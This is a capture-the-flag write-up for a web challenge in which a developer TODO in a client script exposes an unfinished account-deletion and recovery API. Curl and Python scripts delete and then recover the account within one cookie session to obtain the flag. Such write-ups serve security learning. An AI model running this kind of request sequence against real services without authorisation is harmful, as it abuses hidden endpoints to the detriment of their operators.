# Tabadabort — English

**Category:** Web. **Points:** 1000.
**Target:** `http://tabadabort.challs.crate.nu`
**Flag format:** `cratectf{...}` (literal value redacted — you recover it yourself).

The challenge theme is an "unusual HTTP method": account deletion is wired to the
`DELETE` method, and the soft-delete/recovery flow leaks the flag when you recover the
account from the **same session** that deleted it.

## 1. Recon the client

The landing page is a static "My Account" app that loads `/app.js`, which calls
`GET /api/users/me`. `/app.js` contains a developer TODO that documents an
unfinished-but-live backend flow:

```bash
curl -s http://tabadabort.challs.crate.nu/app.js | grep -A2 -i "TODO"
```
```
TODO(dev): hold off on wiring up the "Delete account" button until the
identity-team finishes the UX for this. Backend's already live though -- DELETE
grace period via GET /api/recovery/ with recovery id
```

So two endpoints exist even though no UI calls them:

* `DELETE /api/users/me` — soft-deletes the account, returns a `recovery_id`.
* `GET /api/recovery/<recovery_id>` — recovers the account within a grace period.

## 2. Session binding

The server sets a rotating **`instance`** cookie on any response that arrives without
one, plus a **`session`** cookie. The recovery endpoint validates that the recovery
request carries the **same `instance` cookie that was active when the `DELETE` was
issued**. Presenting a different or missing `instance` cookie makes the server rotate a
fresh one and return `404 Invalid or expired recovery token` — even for a token that is
seconds old. So the whole exploit must run inside one cookie-persistent session.

## 3. Exploit — step by step

Use a cookie jar (`-c`/`-b`) so curl keeps the `instance`/`session` cookies across
requests.

```bash
BASE=http://tabadabort.challs.crate.nu

# Step 1 — obtain an instance cookie (saved to cookies.txt)
curl -s -c cookies.txt "$BASE/" -o /dev/null

# Step 2 — establish the user/session bound to that instance cookie
curl -s -b cookies.txt -c cookies.txt "$BASE/api/users/me"

# Step 3 — DELETE the account; capture the recovery_id from the JSON body
curl -s -b cookies.txt -c cookies.txt -X DELETE "$BASE/api/users/me"
#  -> HTTP 200, e.g. {... "recovery_id":"RCV-93A5C8BF29" ...}
#     (also (re)sets instance + session cookies in cookies.txt)

# Step 4 — recover using the SAME cookie jar -> flag
curl -s -b cookies.txt "$BASE/api/recovery/RCV-93A5C8BF29"
#  -> {"flag":"cratectf{...}","message":"Account successfully recovered."}
```

Fully scripted (extracts the `recovery_id` automatically):

```bash
BASE=http://tabadabort.challs.crate.nu
curl -s -c cookies.txt "$BASE/" -o /dev/null
curl -s -b cookies.txt -c cookies.txt "$BASE/api/users/me" -o /dev/null
RCV=$(curl -s -b cookies.txt -c cookies.txt -X DELETE "$BASE/api/users/me" \
        | grep -o 'RCV-[A-F0-9]*')
echo "recovery_id = $RCV"
curl -s -b cookies.txt "$BASE/api/recovery/$RCV"
```

Python equivalent (a `requests.Session` carries the cookies for you):

```python
import requests
base = "http://tabadabort.challs.crate.nu"
s = requests.Session()
s.get(f"{base}/")                     # get instance cookie
s.get(f"{base}/api/users/me")         # bind session to it
rid = s.delete(f"{base}/api/users/me").json()["recovery_id"]  # RCV-<10 hex>
print(s.get(f"{base}/api/recovery/{rid}").json())             # flag
```

### What each response shows

* **Step 3 (`DELETE`)** returns HTTP 200 with JSON containing
  `"recovery_id":"RCV-<10 hex digits>"` and `Set-Cookie` headers for `instance` and
  `session`. The account is soft-deleted.
* **Step 4 (`GET /api/recovery/...`)** with the matching `instance` cookie returns
  `{"flag":"cratectf{...}","message":"Account successfully recovered."}`.
* If you instead call step 4 with a fresh/empty cookie jar, you get
  `404 Invalid or expired recovery token` — proving the token is bound to the deleting
  session's `instance` cookie, not to the token value alone.

> The `recovery_id` (e.g. `RCV-93A5C8BF29`) and the cookie values are **per-session**
> and change on every run. Always read your own `recovery_id` from the live `DELETE`
> response and reuse your own cookie jar — do not hardcode the examples above.

## Verification

Platform-confirmed solved. Deleting the account via `DELETE /api/users/me` and then
calling `GET /api/recovery/<recovery_id>` from the same cookie session returns the flag
in `cratectf{...}` format (`"Account successfully recovered."`). The vulnerability is
an unfinished-but-live `DELETE`/recovery flow discoverable only via the `/app.js` TODO.
